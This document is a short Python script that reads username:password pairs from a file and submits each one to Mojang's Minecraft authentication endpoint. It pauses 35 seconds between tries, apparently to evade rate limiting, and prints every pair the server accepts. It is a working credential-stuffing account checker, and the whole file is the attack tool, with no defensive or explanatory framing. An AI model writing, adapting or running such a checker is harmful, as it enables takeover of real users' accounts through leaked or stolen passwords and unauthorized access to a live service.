import requests
import json
import time
accounts = open("accounts.txt", "r") #replace accounts.txt with the file name
lines = accounts.readlines()
for line in lines:
    time.sleep(35)
    x = line.split(":")
    user = x[0]
    pwd = x[1][0:-1]
    payload = {
    "agent": {
        "name": "Minecraft",
        "version": 1
    },
    "username": user,
    "password": pwd,
    }
    headers = {"content-type":"application/json"}
    response = requests.post("https://authserver.mojang.com/authenticate", data=json.dumps(payload), headers=headers)
    if (response.status_code == 200):
        print(user,pwd)
    else:
        print(user,response.status_code)